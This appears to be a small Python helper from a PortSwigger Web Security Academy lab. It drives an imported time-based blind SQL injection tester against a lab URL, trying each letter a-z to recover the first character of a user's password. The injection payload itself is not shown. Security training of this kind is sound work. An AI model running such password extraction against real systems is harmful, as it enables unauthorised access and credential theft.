#!/usr/bin/env python3
"""Test just the first character to verify it's 'h'"""

import sys
sys.path.append('/Users/omrinuri/projects/portswigger')
from sql_injection_tester import SQLInjectionTester

# Create tester
url = "https://0a74008f03ac80f9c7eba70a0010003e.web-security-academy.net"
tester = SQLInjectionTester(url, delay_threshold=1.5)

print("Testing first character of password...")
print("=" * 60)

# Test just position 1 with characters a-z
position = 1
for char in 'abcdefghijklmnopqrstuvwxyz':
    is_match, response_time = tester.test_character(position, char)
    if is_match:
        print(f"\n\nFOUND IT! First character is: '{char}'")
        break

print("\nTest complete.")